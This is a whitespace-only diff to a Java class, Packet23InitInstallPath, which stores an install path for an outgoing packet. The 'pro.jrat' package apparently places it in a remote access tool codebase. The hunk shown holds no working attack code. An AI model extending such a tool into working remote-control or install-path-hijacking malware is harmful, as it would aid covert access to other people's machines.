@@ -4,11 +4,10 @@ import java.io.DataOutputStream;
 
 import pro.jrat.common.io.StringWriter;
 
-
 public class Packet23InitInstallPath extends AbstractOutgoingPacket {
 
 	private String path;
-	
+
 	public Packet23InitInstallPath(String path) {
 		this.path = path;
 	}
